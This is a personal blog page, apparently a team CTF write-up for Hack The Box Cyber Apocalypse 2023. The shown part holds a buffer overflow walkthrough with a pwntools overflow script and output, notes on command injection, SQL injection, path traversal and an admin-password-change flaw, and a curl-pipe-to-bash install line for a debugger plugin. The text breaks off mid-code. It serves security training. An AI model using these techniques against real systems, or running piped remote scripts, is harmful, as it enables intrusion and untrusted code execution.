@@ -1,0 +1,1010 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>document.documentElement.classList.add("js");(function(){function a(k){var o=[];try{var p=String(window.name||"").split(";");for(var i=0;i<p.length;i++){var q=p[i].split("=");if(q[0]===k&&q[1])o.push(q[1])}}catch(e){}try{var m=document.cookie.match(new RegExp("(?:^|; )"+k+"=([^;]*)"));if(m)o.push(decodeURIComponent(m[1]))}catch(e){}try{var v=localStorage.getItem(k);if(v!==null&&typeof v!=="undefined")o.push(v)}catch(e){}return o}function g(k){var v=a(k);return v.length?v[0]:null}function p(){var b=null;a("fg-prefs").forEach(function(r){var x=String(r).split(".");if(x.length!==3)return;var t=parseInt(x[0],36);if(!isFinite(t)||t<=0)return;var th=x[1]==="light"||x[1]==="dark"?x[1]:null;var rl=x[2]==="c"||x[2]==="o"?x[2]:null;if(th||rl){if(!b||t>b.t)b={t:t,th:th,rl:rl}}});if(b)return b;var th=g("fg-theme"),rl=g("fg-spine-v2");if(th==="light"||th==="dark"||rl==="c"||rl==="o")return{t:0,th:th==="light"||th==="dark"?th:null,rl:rl==="c"||rl==="o"?rl:null};return null}try{var s=p();var th=s&&s.th?s.th:(matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");document.documentElement.setAttribute("data-theme",th);if(s&&s.rl==="c")document.documentElement.classList.add("nav-collapsed")}catch(e){document.documentElement.setAttribute("data-theme","dark")}})();</script>
+    <link rel="icon" type="image/svg+xml" href="../favicon.svg">
+    <link rel="alternate icon" type="image/x-icon" href="../assets/images/favicon.ico">
+    <link rel="stylesheet" href="../assets/css/reset.css?v=8">
+    <link rel="stylesheet" href="../assets/css/site.css?v=176">
+    <title>Frédéric Goossens | HTB: Cyber Apocalypse 2023</title>
+</head>
+<body>
+    <a class="skip" href="#main">Skip to content</a>
+
+    <header class="spine">
+        <div class="spine-id">
+            <a class="si-id" href="../index.html" aria-label="Frédéric Goossens - Home">
+                <span class="si-photo"><img src="../assets/images/pfp.jpg" alt="Frédéric Goossens"></span>
+                <span class="si-prompt"><span class="sigil">$</span>whoami</span>
+                <span class="si-name">Frédéric Goossens</span>
+                <span class="si-roles"><span>Pentester</span><span>OSCP · BSCP</span></span>
+            </a>
+            <div class="si-socials">
+                <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></a>
+                <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
+            </div>
+        </div>
+        <nav aria-label="Primary">
+            <ul>
+                <li><a href="../index.html"><span class="n">01</span><span class="l">Home</span></a></li>
+                <li><a href="../resume.html"><span class="n">02</span><span class="l">Resume</span></a></li>
+                <li><a href="../writing.html"><span class="n">03</span><span class="l">Writing</span></a></li>
+                <li><a href="../htb.html"><span class="n">04</span><span class="l">HackTheBox</span></a></li>
+            </ul>
+        </nav>
+        <div class="spine-foot">
+            <button class="theme-btn" type="button" data-theme-toggle aria-label="Toggle color theme" aria-pressed="false"><svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg><svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg></button>
+            <button class="spine-toggle" type="button" data-spine-toggle aria-expanded="true" aria-label="Collapse navigation"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M15 18l-6-6 6-6"/></svg></button>
+        </div>
+    </header>
+
+    <div class="topbar">
+        <a class="topbar-id" href="../index.html" aria-label="Frédéric Goossens - Home"><img src="../assets/images/pfp.jpg" alt="Frédéric Goossens"></a>
+        <div class="tb-actions">
+            <button class="theme-btn" type="button" data-theme-toggle aria-label="Toggle color theme" aria-pressed="false"><svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg><svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg></button>
+            <button class="menu-btn" type="button" data-menu-open aria-label="Open menu" aria-controls="menu" aria-haspopup="dialog" aria-expanded="false">
+                <span></span><span></span><span></span>
+            </button>
+        </div>
+    </div>
+
+    <div id="menu" role="dialog" aria-modal="true" aria-label="Navigation menu" aria-hidden="true" inert>
+        <div class="menu-top">
+            <a class="mi-id" href="../index.html" aria-label="Frédéric Goossens - Home"><img src="../assets/images/pfp.jpg" alt=""><span>Frédéric Goossens</span></a>
+            <button class="close-btn" type="button" data-menu-close>Close ×</button>
+        </div>
+        <nav aria-label="Mobile">
+            <ul>
+                <li><a href="../index.html"><span class="n">01</span>Home</a></li>
+                <li><a href="../resume.html"><span class="n">02</span>Resume</a></li>
+                <li><a href="../writing.html"><span class="n">03</span>Writing</a></li>
+                <li><a href="../htb.html"><span class="n">04</span>HackTheBox</a></li>
+            </ul>
+        </nav>
+        <div class="menu-foot">
+            <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg><span>GitHub</span></a>
+            <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg><span>LinkedIn</span></a>
+        </div>
+    </div>
+
+    <div class="progress"></div>
+
+    <div class="shell">
+        <main class="wrap" id="main">
+            <div class="post-wrap">
+                <article class="post" data-cover="../assets/images/htb/cyber-apocalypse-2023/logo.png">
+                    <a class="crumb" href="../htb.html">← Other write-ups</a>
+                    <h1 data-type="HTB: Cyber Apocalypse 2023" data-prefix="# "></h1>
+
+                    <div class="info">
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3l7 3v5c0 4.6-3 8.2-7 10-4-1.8-7-5.4-7-10V6l7-3z"/></svg>
+                                Platform
+                            </span>
+                            <span class="meta-v">Hack The Box</span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg>
+                                Read time
+                            </span>
+                            <span class="meta-v" data-read-time-auto=""></span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M4 20l4-1L20 7l-3-3L5 16l-1 4z"/></svg>
+                                Author
+                            </span>
+                            <span class="meta-v">Frédéric Goossens</span>
+                        </div>
+                    </div>
+
+<aside class="dev-note">
+    <p><span class="dn-k">Collaboration</span>Cyber Apocalypse 2023 was played as a team event: the challenges and write-ups below were solved in collaboration with a teammate rather than solo.</p>
+</aside>
+
+<h2>Pwn</h2>
+
+<details>
+<summary>Questionnaire</summary>
+<div class="inner">
+<p><strong>Is this a '32-bit' or '64-bit' ELF? (e.g. 1337-bit)</strong></p><p><code>$ file test</code></p><blockquote>test: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5a83587fbda6ad7b1aeee2d59f027a882bf2a429, for GNU/Linux 3.2.0, not stripped</blockquote><p>→ 64bit</p><p><strong>What's the linking of the binary? (e.g. static, dynamic)</strong></p><p>→ dynamic</p><p><strong>Is the binary 'stripped' or 'not stripped'?</strong></p><p>→ not stripped</p><p><strong>Which protections are enabled (Canary, NX, PIE, Fortify)?</strong></p><p>Install gdb debugger and <a href="https://github.com/hugsy/gef">https://github.com/hugsy/gef</a></p><p><code>sudo apt install gdb</code></p><p><code>$ bash -c "$(curl -fsSL https://gef.blah.cat/sh)"</code></p><p><code>gdb test</code></p><p><code>checksec</code></p><pre><code>Canary                        : ✘
+NX                            : ✓
+PIE                           : ✘
+Fortify                       : ✘
+RelRO                         : Partial</code></pre><p>→ NX</p><pre><code>◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉
+◉                                                                                                       ◉
+◉  Great job so far! Now it's time to see some C code and a binary file.                                ◉
+◉                                                                                                       ◉
+◉  In the pwn_questionnaire.zip there are two files:                                                    ◉
+◉                                                                                                       ◉
+◉  1. test.c                                                                                            ◉
+◉  2. test                                                                                              ◉
+◉                                                                                                       ◉
+◉  The 'test.c' is the source code and 'test' is the output binary.                                     ◉
+◉                                                                                                       ◉
+◉  Let's start by analyzing the code.                                                                   ◉
+◉  First of all, let's focus on the '#include &lt;stdio.h&gt;' line.                                          ◉
+◉  It includes the 'stdio.h' header file to use some of the standard functions like 'printf()'.         ◉
+◉  The same principle applies for the '#include &lt;stdlib.h&gt;' line, for other functions like 'system()'.  ◉
+◉                                                                                                       ◉
+◉  Now, let's take a closer look at:                                                                    ◉
+◉                                                                                                       ◉
+◉  void main(){                                                                                         ◉
+◉      vuln();                                                                                          ◉
+◉  }                                                                                                    ◉
+◉                                                                                                       ◉
+◉  By default, a binary file starts executing from the 'main()' function.                               ◉
+◉                                                                                                       ◉
+◉  In this case, 'main()' only calls another function, 'vuln()'.                                        ◉
+◉  The function 'vuln()' has 3 lines.                                                                   ◉
+◉                                                                                                       ◉
+◉  void vuln(){                                                                                         ◉
+◉      char buffer[0x20] = {0};                                                                         ◉
+◉      fprintf(stdout, "\nEnter payload here: ");                                                       ◉
+◉      fgets(buffer, 0x100, stdin);                                                                     ◉
+◉  }                                                                                                    ◉
+◉                                                                                                       ◉
+◉  The first line declares a 0x20-byte buffer of characters and fills it with zeros.                    ◉
+◉  The second line calls 'fprintf()' to print a message to stdout.                                      ◉
+◉  Finally, the third line calls 'fgets()' to read 0x100 bytes from stdin and store them to the         ◉
+◉  aformentioned buffer.                                                                                ◉
+◉                                                                                                       ◉
+◉  Then, there is a custom 'gg()' function which calls the standard 'system()' function to print the    ◉
+◉  flag. This function is never called by default.                                                      ◉
+◉                                                                                                       ◉
+◉  void gg(){                                                                                           ◉
+◉      system("cat flag.txt");                                                                          ◉
+◉  }                                                                                                    ◉
+◉                                                                                                       ◉
+◉  Run the 'man &lt;function_name&gt;' command to see the manual page of a standard function (e.g. man fgets).◉
+◉                                                                                                       ◉
+◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉</code></pre><p><strong>What is the name of the custom function that gets called inside </strong><strong><code>main()</code></strong><strong>? (e.g. vulnerable_function())</strong></p><p>→ vuln</p><p><strong>What is the size of the 'buffer' (in hex or decimal)?</strong></p><p>→ 0x20</p><p><strong>Which custom function is never called? (e.g. vuln())</strong></p><p>→ gg</p><pre><code>◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉
+◉                                                                                                       ◉
+◉  Excellent! Now it's time to talk about Buffer Overflows.                                             ◉
+◉                                                                                                       ◉
+◉  Buffer Overflow means there is a buffer of characters, integers or any other type of variables,      ◉
+◉  and someone inserts into this buffer more bytes than it can store.                                   ◉
+◉                                                                                                       ◉
+◉  If the user inserts more bytes than the buffer's size, they will be stored somewhere in the memory   ◉
+◉  after the address of the buffer, overwriting important addresses for the flow of the program.        ◉
+◉  This, in most cases, will make the program crash.                                                    ◉
+◉                                                                                                       ◉
+◉  When a function is called, the program knows where to return because of the 'return address'. If the ◉
+◉  player overwrites this address, they can redirect the flow of the program wherever they want.        ◉
+◉  To print a function's address, run 'p &lt;function_name&gt;' inside 'gdb'. (e.g. p main)                   ◉
+◉                                                                                                       ◉
+◉  gef➤  p gg                                                                                           ◉
+◉  $1 = {&lt;text variable, no debug info&gt;} 0x401176 &lt;gg&gt;                                                  ◉
+◉                                                                                                       ◉
+◉  To perform a Buffer Overflow in the simplest way, we take these things into consideration.           ◉
+◉                                                                                                       ◉
+◉  1. Canary is disabled so it won't quit after the canary address is overwritten.                      ◉
+◉  2. PIE is disabled so the addresses of the binary functions are not randomized and the user knows    ◉
+◉     where to return after overwritting the return address.                                            ◉
+◉  3. There is a buffer with N size.                                                                    ◉
+◉  4. There is a function that reads to this buffer more than N bytes.                                  ◉
+◉                                                                                                       ◉
+◉  Run printf 'A%.0s' {1..30} | ./test to enter 30*"A" into the program.                                ◉
+◉                                                                                                       ◉
+◉  Run the program manually with "./test" and insert 30*A, then 39, then 40 and see what happens.       ◉
+◉                                                                                                       ◉
+◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉</code></pre><p>Gets printed twice?</p><p><strong>What is the name of the standard function that could trigger a Buffer Overflow? (e.g. fprintf())</strong></p><p>→ fgets</p><p><strong>After how many bytes a Segmentation Fault occurs (in hex or decimal)?</strong></p><pre><code>┌──(student㉿kali4students)-[~/Desktop]
+└─$ printf 'A%.0s' {1..30} | ./test
+
+Enter payload here:
+┌──(student㉿kali4students)-[~/Desktop]
+└─$ printf 'A%.0s' {1..39} | ./test
+
+Enter payload here:
+┌──(student㉿kali4students)-[~/Desktop]
+└─$ printf 'A%.0s' {1..40} | ./test
+
+Enter payload here:
+Enter payload here:</code></pre><p>→ 40</p><p><strong>What is the address of 'gg()' in hex? (e.g. 0x401337)</strong></p><pre><code>gef➤  p gg
+$3 = {&lt;text variable, no debug info&gt;} 0x401176 &lt;gg&gt;</code></pre><p><mark class="highlight-yellow_background" data-notion-highlight="yellow_background">HTB{th30ry_bef0r3_4cti0n}</mark></p>
+</div>
+</details>
+
+<details>
+<summary>Getting started</summary>
+<div class="inner">
+<p><code>./gs</code></p><pre><code>Stack frame layout
+
+|      .      | &lt;- Higher addresses
+|      .      |
+|_____________|
+|             | &lt;- 64 bytes
+| Return addr |
+|_____________|
+|             | &lt;- 56 bytes
+|     RBP     |
+|_____________|
+|             | &lt;- 48 bytes
+|   target    |
+|_____________|
+|             | &lt;- 40 bytes
+|  alignment  |
+|_____________|
+|             | &lt;- 32 bytes
+|  Buffer[31] |
+|_____________|
+|      .      |
+|      .      |
+|_____________|
+|             |
+|  Buffer[0]  |
+|_____________| &lt;- Lower addresses
+
+
+      [Addr]       |      [Value]
+-------------------+-------------------
+0x00007ffddf6f35d0 | 0x0000000000000000 &lt;- Start of buffer
+0x00007ffddf6f35d8 | 0x0000000000000000
+0x00007ffddf6f35e0 | 0x0000000000000000
+0x00007ffddf6f35e8 | 0x0000000000000000
+0x00007ffddf6f35f0 | 0x6969696969696969 &lt;- Dummy value for alignment
+0x00007ffddf6f35f8 | 0x00000000deadbeef &lt;- Target to change
+0x00007ffddf6f3600 | 0x000055f745895800 &lt;- Saved rbp
+0x00007ffddf6f3608 | 0x00007fcab7c21c87 &lt;- Saved return address
+0x00007ffddf6f3610 | 0x0000000000000001
+0x00007ffddf6f3618 | 0x00007ffddf6f36e8
+
+
+After we insert 4 "A"s, (the hex representation of A is 0x41), the stack layout like this:
+
+
+      [Addr]       |      [Value]
+-------------------+-------------------
+0x00007ffddf6f35d0 | 0x0000000041414141 &lt;- Start of buffer
+0x00007ffddf6f35d8 | 0x0000000000000000
+0x00007ffddf6f35e0 | 0x0000000000000000
+0x00007ffddf6f35e8 | 0x0000000000000000
+0x00007ffddf6f35f0 | 0x6969696969696969 &lt;- Dummy value for alignment
+0x00007ffddf6f35f8 | 0x00000000deadbeef &lt;- Target to change
+0x00007ffddf6f3600 | 0x000055f745895800 &lt;- Saved rbp
+0x00007ffddf6f3608 | 0x00007fcab7c21c87 &lt;- Saved return address
+0x00007ffddf6f3610 | 0x0000000000000001
+0x00007ffddf6f3618 | 0x00007ffddf6f36e8
+
+
+After we insert 4 "B"s, (the hex representation of B is 0x42), the stack layout looks like this:
+
+
+      [Addr]       |      [Value]
+-------------------+-------------------
+0x00007ffddf6f35d0 | 0x4242424241414141 &lt;- Start of buffer
+0x00007ffddf6f35d8 | 0x0000000000000000
+0x00007ffddf6f35e0 | 0x0000000000000000
+0x00007ffddf6f35e8 | 0x0000000000000000
+0x00007ffddf6f35f0 | 0x6969696969696969 &lt;- Dummy value for alignment
+0x00007ffddf6f35f8 | 0x00000000deadbeef &lt;- Target to change
+0x00007ffddf6f3600 | 0x000055f745895800 &lt;- Saved rbp
+0x00007ffddf6f3608 | 0x00007fcab7c21c87 &lt;- Saved return address
+0x00007ffddf6f3610 | 0x0000000000000001
+0x00007ffddf6f3618 | 0x00007ffddf6f36e8
+
+◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉
+◉                                                                                                 ◉
+◉  Fill the 32-byte buffer, overwrite the alginment address and the "target's" 0xdeadbeef value.  ◉
+◉                                                                                                 ◉
+◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉
+
+&gt;&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+
+      [Addr]       |      [Value]
+-------------------+-------------------
+0x00007ffddf6f35d0 | 0x4141414141414141 &lt;- Start of buffer
+0x00007ffddf6f35d8 | 0x4141414141414141
+0x00007ffddf6f35e0 | 0x4141414141414141
+0x00007ffddf6f35e8 | 0x4141414141414141
+0x00007ffddf6f35f0 | 0x4141414141414141 &lt;- Dummy value for alignment
+0x00007ffddf6f35f8 | 0x0041414141414141 &lt;- Target to change
+0x00007ffddf6f3600 | 0x000055f745895800 &lt;- Saved rbp
+0x00007ffddf6f3608 | 0x00007fcab7c21c87 &lt;- Saved return address
+0x00007ffddf6f3610 | 0x0000000000000001
+0x00007ffddf6f3618 | 0x00007ffddf6f36e8
+
+HTB{f4k3_fl4g_4_t35t1ng}</code></pre><p>Updated this python script:</p><pre><code>#!/usr/bin/python3.8
+
+'''
+You need to install pwntools to run the script.
+To run the script: python3 ./wrapper.py
+'''
+
+# Library
+from pwn import *
+
+# Open connection
+IP   = '165.232.100.143' # Change this
+PORT = 30829      # Change this
+
+r    = remote(IP, PORT)
+
+# Craft payload
+payload = b'A' * 48 # Change the number of "A"s
+
+# Send payload
+r.sendline(payload)
+
+# Read flag
+success(f'Flag --&gt; {r.recvline_contains(b"HTB").strip().decode()}')</code></pre><p>→ 48 A’s</p><pre><code>┌──(student㉿kali4students)-[~/Desktop/challenge]
+└─$ python3 wrapper.py
+[+] Opening connection to 165.232.100.143 on port 30829: Done
+[+] Flag --&gt; HTB{b0f_s33m5_3z_r1ght?}
+[*] Closed connection to 165.232.100.143 port 30829</code></pre><p><mark class="highlight-teal" data-notion-highlight="teal"><strong>Flag </strong></mark>→ <mark class="highlight-yellow_background" data-notion-highlight="yellow_background">HTB{b0f_s33m5_3z_r1ght?}</mark></p>
+</div>
+</details>
+
+<details>
+<summary>Labyrinth (Need help to find the buffer overflow?)</summary>
+<div class="inner">
+<p>Escape_plan method never gets executed. So probably a buffer overflow where you need to inject the address of the Escape_plan method</p><pre data-lang="c"><code>undefined8 main(void)
+
+{
+  int iVar1;
+  undefined8 local_38;
+  undefined8 local_30;
+  undefined8 local_28;
+  undefined8 local_20;
+  char *local_18;
+  ulong local_10;
+
+  setup();
+  banner();
+  local_38 = 0;
+  local_30 = 0;
+  local_28 = 0;
+  local_20 = 0;
+  fwrite("\nSelect door: \n\n",1,0x10,stdout);
+  for (local_10 = 1; local_10 &lt; 0x65; local_10 = local_10 + 1) {
+    if (local_10 &lt; 10) {
+      fprintf(stdout,"Door: 00%d ",local_10);
+    }
+    else if (local_10 &lt; 100) {
+      fprintf(stdout,"Door: 0%d ",local_10);
+    }
+    else {
+      fprintf(stdout,"Door: %d ",local_10);
+    }
+    if ((local_10 % 10 == 0) &amp;&amp; (local_10 != 0)) {
+      putchar(10);
+    }
+  }
+  fwrite(&amp;DAT_0040248f,1,4,stdout);
+  local_18 = (char *)malloc(0x10);
+  fgets(local_18,5,stdin);
+  iVar1 = strncmp(local_18,"69",2);
+  if (iVar1 != 0) {
+    iVar1 = strncmp(local_18,"069",3);
+    if (iVar1 != 0) goto LAB_004015da;
+  }
+  fwrite("\nYou are heading to open the door but you suddenly see something on the wall:\n\n\"Fly like a bird and be free!\"\n\nWould you like to change the door you chose?\n\n&gt;&gt; "
+         ,1,0xa0,stdout);
+  fgets((char *)&amp;local_38,0x44,stdin);
+LAB_004015da:
+  fprintf(stdout,"\n%s[-] YOU FAILED TO ESCAPE!\n\n",&amp;DAT_00402541);
+  return 0;
+}
+
+
+void escape_plan(void)
+
+{
+  ssize_t sVar1;
+  char local_d;
+  int local_c;
+
+  putchar(10);
+  fwrite(&amp;DAT_00402018,1,0x1f0,stdout);
+  fprintf(stdout,
+          "\n%sCongratulations on escaping! Here is a sacred spell to help you continue your journey: %s\n"
+          ,&amp;DAT_0040220e,&amp;DAT_00402209);
+  local_c = open("./flag.txt",0);
+  if (local_c &lt; 0) {
+    perror("\nError opening flag.txt, please contact an Administrator.\n\n");
+                    // WARNING: Subroutine does not return
+    exit(1);
+  }
+  while( true ) {
+    sVar1 = read(local_c,&amp;local_d,1);
+    if (sVar1 &lt; 1) break;
+    fputc((int)local_d,stdout);
+  }
+  close(local_c);
+  return;
+}</code></pre>
+</div>
+</details>
+
+<h2>Web</h2>
+
+<details>
+<summary>Drobots</summary>
+<div class="inner">
+<blockquote>Pandora's latest mission as part of her reconnaissance training is to infiltrate the Drobots firm that was suspected of engaging in illegal activities. Can you help pandora with this task?</blockquote><p>Ping command was vulnerable to command injection:</p><figure><img src="../assets/images/htb/cyber-apocalypse-2023/01-untitled.png" alt=""></figure><p><mark class="highlight-teal" data-notion-highlight="teal"><strong>Flag</strong></mark> → HTB{4lw4y5_54n1t1z3_u53r_1nput!!!}</p>
+</div>
+</details>
+
+<details>
+<summary>Trapped Source</summary>
+<div class="inner">
+<blockquote>Intergalactic Ministry of Spies tested Pandora's movement and intelligence abilities. She found herself locked in a room with no apparent means of escape. Her task was to unlock the door and make her way out. Can you help her in opening the door?</blockquote><p>Found this CONFIG object in the script:</p><pre><code>if (CONFIG.correctPin == pin) {
+		fetch('/flag', {
+			method: 'POST',
+			headers: {
+				'Content-Type': 'application/json'
+			},
+			body: JSON.stringify({
+				'pin': CONFIG.correctPin
+			})
+		})
+		.then((data) =&gt; data.json())
+		.then((res) =&gt; {
+			$('.lockStatus').css('font-size', '8px')
+			$('.lockStatus').text(res.message)
+		})
+		return
+	}</code></pre><figure><img src="../assets/images/htb/cyber-apocalypse-2023/02-untitled-1.png" alt=""></figure><p><mark class="highlight-teal" data-notion-highlight="teal"><strong>Flag</strong></mark> → <mark class="highlight-yellow_background" data-notion-highlight="yellow_background">HTB{V13w_50urc3_c4n_b3_u53ful!!!}</mark></p>
+</div>
+</details>
+
+<details>
+<summary>Orbital</summary>
+<div class="inner">
+<blockquote>In order to decipher the alien communication that held the key to their location, she needed access to a decoder with advanced capabilities - a decoder that only The Orbital firm possessed. Can you get your hands on the decoder?</blockquote><p>You can use SQLI to login as admin.</p><figure><img src="../assets/images/htb/cyber-apocalypse-2023/03-untitled-2.png" alt=""></figure><p>After logging in you can use directory traversal to export the flag</p><figure><img src="../assets/images/htb/cyber-apocalypse-2023/04-untitled-3.png" alt=""></figure><p><mark class="highlight-teal" data-notion-highlight="teal"><strong>Flag</strong></mark> → HTB{T1m3_b4$3d_$ql1_4r3_fun!!!}</p>
+</div>
+</details>
+
+<details>
+<summary>Passman</summary>
+<div class="inner">
+<blockquote>Pandora discovered the presence of a mole within the ministry. To proceed with caution, she must obtain the master control password for the ministry, which is stored in a password manager. Can you hack into the password manager?</blockquote><p>The updatePassword requests takes username from argument instead of session. Because of this you can change the password of the admin user.</p><pre data-lang="jsx"><code>UpdatePassword:
+            type: ResponseType,
+            args: {
+                username: { type: new GraphQLNonNull(GraphQLString) },
+                password: { type: new GraphQLNonNull(GraphQLString) }
+            },
+            resolve: async (root, args, request) =&gt; {
+                return new Promise((resolve, reject) =&gt; {
+                    if (!request.user) return reject(new GraphQLError('Authentication required!'));
+
+                    db.updatePassword(args.username, args.password)
+                        .then(() =&gt; resolve(response("Password updated successfully!")))
